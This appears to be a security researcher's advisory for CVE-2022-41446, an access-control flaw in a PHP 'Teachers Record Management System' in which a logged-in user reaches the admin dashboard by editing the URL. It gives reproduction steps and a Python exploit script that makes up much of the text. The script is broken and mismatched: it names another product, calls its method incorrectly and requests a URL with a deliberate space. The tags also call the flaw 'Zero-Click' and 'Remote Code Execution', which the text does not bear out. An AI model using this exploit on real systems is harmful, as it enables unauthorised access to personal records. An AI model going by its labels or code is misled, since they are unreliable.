---
title: CVE-2022-41446 - Escalation of Privileges in Teachers Record Management System Using CodeIgniter 1.0
author: RashidKhanPathan
date: 2022-11-03 11:33:00 +0800
categories: [Exploit, Zero-Click Exploit, Remote Code Execution, Web Exploitation, 0Day]
tags: [exploit, 0Day, WebApp Exploitation,Remote Code Execution]
toc: true
---

**Date:**
Nov 3, 2022

**Vulnerability Type:**
Incorrect Access Control - Privilege Escalation

**Vendor:**
Phpgurukul

**Affected Product:**
Teachers Record Management System using CodeIgniter - 1.0

**Description:**
A critical access control issue has been exposed in /Admin/dashboard.php of the Teachers Record Management System using CodeIgniter v1.0 (CVE-2022-41446). This vulnerability permits attackers to illicitly access and modify user data, resulting in a potentially severe escalation of privileges and information disclosure.

**Steps to Reproduce:**
1. Log in with a user account in the Teachers Record Management System.
2. Navigate to the user's dashboard by accessing the URL: http://localhost/trms-ci/user/Users/dashboard.
3. Modify the URL endpoint to admin/Admin/dashboard, creating the URL: http://localhost/trms-ci/admin/Admin/dashboard.
4. Access the manipulated URL, granting unauthorized access to the admin dashboard.
5. Observe and potentially modify user data within the admin dashboard.


**Proof of Concept:**
[View Proof of Concept](https://drive.google.com/file/d/1Rre498CWp9pWyW9h5ran8GkW6TA2NztC/view?usp=sharing)

**Exploit Code**

```python
# /*
# Authenticated Vertical Privilege Escalation Vulnerability
# Step: 1 Login With Teacher's Credentials Username: amit@gmail.com Password: Test@123
# Step: 2 Change user/User to admin/Admin Url Patemeter
# */

import argparse
import requests
from termcolor import cprint
import sys
from bs4 import *
color = "green"
cprint("[+] CVE-2022-41446 Authenticated Privilege Escalation in Blood Donor Management System v1.0", color)
cprint("[+] Author: RashidKhan Pathan aka iHexCoder", color)
cprint("[!] Usage: run exploit.py username password payload", color)
cprint("[!] Example: python3 exploit.py admin johndoe@gmail.com Test@123", color)

class PrivilegeEscalation(object):
    color = "green"

    def __init__(self, username, password, payload):
        self.username = username
        self.password = password
        self.paylaod = payload

    def authentication(self):
        color = "green"
        cprint("[+] Authenticating User", color)
        cprint("[+] Username: " + args.username, color)
        cprint("[+] Password: " + args.password, color)
        cprint("[+] Payload: " + args.payload, color)

        login_url = "http://localhost/trms-ci/user/login"

        data = {
            "email": args.username,
            "password": args.password
        }
        login_response = requests.post(login_url, data=data)

        cprint("[+] Exploiting...Started", color)
        if "/user/login" in login_response.url:
            cprint("[+] Credentials is not Valid", "red")
            sys.exit(1)
        else:
            cprint("[+] Authenticated Successfully as a Normal User ", color)
            cprint("[+] Normal User URL Endpoint " + login_response.url, color)

        url = args.payload
        if args.payload != "admin/Admin":
            cprint("[+] Please Add Valid Payload", "red")
            sys.exit(1)
                                                                # Keep The Space Here Beetween r and d
                                                                # But remove The Space Between r and d in URL
        response = requests.get(f"http://localhost/trms-ci/{url}/dashboar d")
        cprint("[+] Remove The Space Between r and d in URL", color)
        cprint("[+] Exploit Compleated", color)
        cprint("[+] Accessed Admin Panel Successfully " +
               response.url, color)
        cprint("[+] Copy the URL and Replace with user/User/dashboard URL with " +
               response.url, color)
        cprint(
            "[+] After Replacing it You Should see the Bypassed Admin Panel", color)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("username", help="Please Add Username", type=str)
    parser.add_argument("password", help="Please Add Password", type=str)
    parser.add_argument("payload", help="Please Add Password", type=str)
    args = parser.parse_args()

    privilegeEscalation = PrivilegeEscalation

    privilegeEscalation.authentication(
        (args.username, args.password, args.payload))
```

**Attack Vector:**
To exploit this vulnerability, an attacker must log in with a user account and manipulate the URL endpoint from user/Users/dashboard to admin/Admin/dashboard. This manipulation grants unauthorized access to the admin dashboard, allowing potential modification of user data.



**Impact:**
This access control vulnerability poses a severe risk, enabling remote attackers to escalate privileges and potentially disclose sensitive information.

**Reference:**
- [Phpgurukul - Teachers Record Management System](https://phpgurukul.com/teachers-record-management-system-using-codeigniter/)
- [Proof of Concept Video](https://drive.google.com/file/d/1Rre498CWp9pWyW9h5ran8GkW6TA2NztC/view?usp=sharing)

**Mitigation:**
To address this security flaw, it is crucial to implement robust access controls, ensuring that users can only access functionalities appropriate to their roles. Regular security assessments and audits are essential for identifying and remediating vulnerabilities in web applications.

**Discoverer:**
RashidKhan Pathan
















